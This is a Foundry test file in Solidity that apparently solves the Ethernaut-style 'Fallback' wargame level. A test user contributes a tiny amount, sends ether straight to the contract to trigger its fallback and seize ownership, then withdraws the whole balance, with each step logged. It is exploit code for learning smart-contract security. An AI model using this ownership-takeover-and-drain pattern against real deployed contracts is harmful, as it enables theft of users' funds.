// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract;
    address public alice;
    address public bob;

    function setUp() public {
        fallbackContract = new Fallback();
        alice = makeAddr("alice");
        vm.deal(alice, 1 ether);
        vm.deal(address(fallbackContract), 10 ether);
    }

    function test_ClaimOwnershipAndReduceAmountTo0() public {
        console.log("Actual Owner: ", fallbackContract.owner());
        console.log("---Alice claiming ownership---");
        vm.startPrank(alice);
        fallbackContract.contribute{value: 0.0009 ether}();
        (bool success, ) = payable(address(fallbackContract)).call{value: 0.001 ether}("");
        require(success, "Send failed");
        console.log("Actual Owner: ", fallbackContract.owner());
        console.log("Alice address: ", address(alice));
        console.log("-------------------");
        console.log("Current contract balance:", address(fallbackContract).balance);
        console.log("Current Alice balance:", address(alice).balance);
        console.log("---Alice withdrawing balance---");
        fallbackContract.withdraw();
        vm.stopPrank();
        console.log("After withdraw contract balance:", address(fallbackContract).balance);
        console.log("After withdraw Alice balance:", address(alice).balance);
    }

}
